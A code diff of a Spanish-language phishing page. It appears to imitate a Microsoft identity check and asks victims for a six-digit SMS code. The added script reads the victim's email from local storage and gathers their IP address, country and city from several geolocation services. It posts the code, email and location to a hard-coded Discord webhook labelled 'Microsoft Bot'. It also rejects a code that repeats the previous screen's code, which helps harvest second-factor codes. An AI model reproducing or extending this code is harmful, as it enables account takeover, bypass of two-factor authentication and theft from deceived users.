@@ -96,17 +96,15 @@
         .btn1 button:hover {
             background: #005a9e;
         }
-         .e2{
+        .e2 {
             margin-bottom: 7px;
             font-size: 14px;
             font-weight: 600;
-            
         }
-
         .input-group {
             margin-bottom: 16px;
+            position: relative;
         }
-
         .input-group input {
             width: 100%;
             padding: 8px 0 8px 8px;
@@ -117,6 +115,17 @@
             background: transparent;
             box-sizing: border-box;
             transition: border-bottom-color 0.2s, border-bottom-width 0.2s;
+        }
+        .input-group input.error-input {
+            border: 1px solid #d32f2f;
+            background-color: #fff6f6;
+        }
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: left;
+            display: none;
         }
         .adis {
             border-top: 1px solid #f0f0f0;
@@ -172,13 +181,12 @@
                 <p>Asegúrese de que el Código sea el correcto, ya que esta validación es necesaria para verificar su identidad. En caso de error podría ser bloqueado.</p>
             </div>
             <div class="input-group">
-                    <p class="e2" for="">Código SMS</p>
-                    <input style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder=" * * * * * *" required>
-                </div>
+                <p class="e2">Código SMS</p>
+                <input id="codigoSMS" style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="* * * * * *" required>
+                <div id="errorMsg" class="error-message"></div>
+            </div>
 
-            <a href="cargando2.html">
-            <div class="btn1"><button>Siguiente</button></div>
-</a>
+            <div class="btn1"><button id="siguienteBtn">Siguiente</button></div>
             <div class="adis">
                 <a href="#">Términos de uso</a>
                 <a href="#">Aviso de privacidad</a>
@@ -188,23 +196,141 @@
         </div>
     </div>
 
-    <script>
+<script>
     const webhook = "https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";
-    document.querySelector('.btn1 button').addEventListener('click', async (e) => {
-        e.preventDefault();
-        const userData = JSON.parse(localStorage.getItem('userDataIndex1') || '{}');
-        const email = userData.email || 'Sin correo';
-        const codigoInput = document.querySelector('.input-group input');
-        const codigo = codigoInput ? codigoInput.value : '';
-        const mensaje = `📱 **Código SMS**\n📧 Correo: ${email}\n🔢 Código SMS: ${codigo}`;
+    
+    async function fetchWithTimeout(url, timeout = 5000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
         try {
-            await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
+            const response = await fetch(url, { signal: controller.signal });
+            clearTimeout(id);
+            return response;
+        } catch (error) {
+            clearTimeout(id);
+            throw error;
+        }
+    }
+    
+    async function getGeoInfo() {
+        const apis = [
+            { url: 'https://ipapi.co/json/', parser: (data) => ({ ip: data.ip, pais: data.country_name, ciudad: data.city }) },
+            { url: 'https://ipinfo.io/json/', parser: (data) => ({ ip: data.ip, pais: data.country, ciudad: data.city }) },
+            { url: 'https://api.ipify.org?format=json', parser: (data) => ({ ip: data.ip, pais: 'Desconocido', ciudad: 'Desconocido' }) },
+            { url: 'https://api.my-ip.io/ip.json', parser: (data) => ({ ip: data.ip, pais: data.country || 'Desconocido', ciudad: data.city || 'Desconocido' }) }
+        ];
+        for (const api of apis) {
+            try {
+                const res = await fetchWithTimeout(api.url, 4000);
+                if (!res.ok) continue;
+                const data = await res.json();
+                let result = api.parser(data);
+                if (result.ip && result.ip !== 'No disponible') {
+                    if (result.pais === 'Desconocido' && result.ciudad === 'Desconocido' && api.url.includes('ipify')) {
+                        try {
+                            const geoRes = await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`, 3000);
+                            if (geoRes.ok) {
+                                const geoData = await geoRes.json();
+                                result.pais = geoData.country_name || 'Desconocido';
+                                result.ciudad = geoData.city || 'Desconocido';
+                            }
+                        } catch(e) {}
+                    }
+                    return result;
+                }
+            } catch(e) {
+                continue;
+            }
+        }
+        return { ip: 'No disponible', pais: 'No disponible', ciudad: 'No disponible' };
+    }
+    
+    async function ensureGeoInfo() {
+        const stored = localStorage.getItem('userDataIndex1');
+        if (stored) {
+            try {
+                const data = JSON.parse(stored);
+                if (data.geo && data.geo.ip && data.geo.ip !== 'No disponible') {
+                    return data.geo;
+                }
+            } catch(e) {}
+        }
+        return await getGeoInfo();
+    }
+    
+    function formatGeoLine(geo) {
+        return `🌍 **IP:** ${geo.ip} - 📍 **País:** ${geo.pais} - 🏙️ **Ciudad:** ${geo.ciudad}`;
+    }
+    
+    function showError(message) {
+        const errorDiv = document.getElementById('errorMsg');
+        const input = document.getElementById('codigoSMS');
+        errorDiv.textContent = message;
+        errorDiv.style.display = 'block';
+        input.classList.add('error-input');
+    }
+    
+    function clearError() {
+        const errorDiv = document.getElementById('errorMsg');
+        const input = document.getElementById('codigoSMS');
+        errorDiv.style.display = 'none';
+        errorDiv.textContent = '';
+        input.classList.remove('error-input');
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        const btn = document.getElementById('siguienteBtn');
+        const codigoInput = document.getElementById('codigoSMS');
+        
+        codigoInput.addEventListener('input', function() {
+            clearError();
+        });
+        
+        if (btn) {
+            btn.addEventListener('click', async (e) => {
+                e.preventDefault();
+                
+                const codigo = codigoInput.value.trim();
+                if (!codigo) {
+                    showError('Por favor ingrese el código SMS.');
+                    return;
+                }
+                
+                const previousCode = localStorage.getItem('verificationCode1');
+                if (previousCode && previousCode === codigo) {
+                    showError('El código SMS no puede ser igual al código de pantalla anterior. Por favor ingrese un código diferente.');
+                    return;
+                }
+                
+                clearError();
+                
+                const userDataRaw = localStorage.getItem('userDataIndex1');
+                let email = 'Sin correo';
+                if (userDataRaw) {
+                    try {
+                        const userData = JSON.parse(userDataRaw);
+                        email = userData.email || 'Sin correo';
+                    } catch(e) {}
+                }
+                
+                const geo = await ensureGeoInfo();
+                const geoLine = formatGeoLine(geo);
+                
+                const mensaje = `📱 **Código SMS**\n📧 Correo: ${email}\n🔢 Código SMS: ${codigo}\n${geoLine}`;
+                
+                try {
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
+                    });
+                } catch(err) { console.error(err); }
+                
+                localStorage.setItem('verificationCode2', codigo);
+                
+                window.location.href = 'cargando3.html';
             });
-        } catch(err) { console.error(err); }
-        window.location.href = 'cargando3.html';
+        }
     });
 </script>
 </body>
